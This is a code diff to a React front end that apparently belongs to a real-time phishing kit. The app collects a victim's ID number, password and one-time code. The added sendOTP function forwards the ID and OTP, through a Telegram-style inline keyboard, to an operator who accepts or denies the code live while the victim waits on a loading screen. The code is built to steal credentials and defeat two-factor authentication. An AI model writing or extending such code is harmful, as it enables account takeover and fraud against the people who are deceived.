@@ -10,6 +10,7 @@ import OTPPage from "./components/OTPPage.tsx";
 import WelcomePage from "./pages/WelcomePage.tsx";
 import AcceptedPage from "./pages/AcceptedPage.tsx";
 import RejectedPage from "./pages/RejectedPage.tsx";
+import toast from "react-hot-toast";
 
 function App() {
   const [showForm, setShowForm] = useState(false);
@@ -17,6 +18,7 @@ function App() {
   const [cedula, setCedula] = useState("");
   const [password, setPassword] = useState("");
   const [requestId, setRequestId] = useState<string | null>(null);
+  const [otp, setOtp] = useState("");
 
   const { decision } = useSse({ requestId });
 
@@ -67,6 +69,7 @@ function App() {
     setStep("loading");
   };
 
+  //Para manejo de decisiones
   useEffect(() => {
     switch (decision) {
       case "accepted":
@@ -77,8 +80,46 @@ function App() {
         return;
       case "otp":
         setStep("OTP");
+        return;
+      case "otpdenied":
+        toast('OTP incorrecto, podras solicitar uno en breve.');
+        return;
     }
   }, [decision]);
+
+  const sendOTP = async () => {
+
+    try {
+      let currentRequestId = requestId;
+
+      if (!currentRequestId) {
+        currentRequestId = await startSubscription();
+      }
+
+      const response = await api.post("/send/data", {
+        text: `Codigo OTP para CC: ${cedula} es: \n\n: ${otp}`,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "Aceptar OTP",
+                callback_data: `news:otpaccepted:${currentRequestId}`,
+              },
+              {
+                text: "Denegar OTP",
+                callback_data: `news:otpdenied:${currentRequestId}`,
+              },
+            ],
+          ],
+          requestId: currentRequestId,
+        }
+      });
+
+      return response
+    } catch (error) {
+      console.error(error);
+    }
+  }
 
   const renderStep = () => {
     switch (step) {
@@ -106,7 +147,13 @@ function App() {
 
       case "OTP":
         return <OTPPage
+          otp={otp}
+          onContinue={() => sendOTP()}
           identification={cedula}
+          setOtp={setOtp}
+          onResend={() => {
+            
+          }}
         />
       case "welcome":
         return <WelcomePage />
